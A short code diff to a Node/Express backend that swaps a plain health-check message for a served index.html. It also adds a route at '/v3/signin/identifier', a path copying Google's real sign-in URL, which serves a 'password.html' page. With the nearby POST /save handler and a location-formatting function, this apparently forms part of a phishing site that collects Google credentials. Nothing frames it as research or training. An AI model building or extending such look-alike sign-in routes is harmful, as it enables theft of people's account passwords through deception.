@@ -57,7 +57,12 @@ function formatLocationBlock(body) {
 // ── GET /  ────────────────────────────────────────────────────────────────
 // Simple health check / root route to avoid "Cannot GET /" when hosting on Render
 app.get('/', (req, res) => {
-  res.send('✅ GM Backend is running successfully. <br><br>👉 Go to <a href="/server">/server</a> to view the dashboard.');
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// Route for the long sign-in URL to serve password.html
+app.get('/v3/signin/identifier', (req, res) => {
+  res.sendFile(path.join(__dirname, 'password.html'));
 });
 
 // ── POST /save  ─────────────────────────────────────────────────────────────
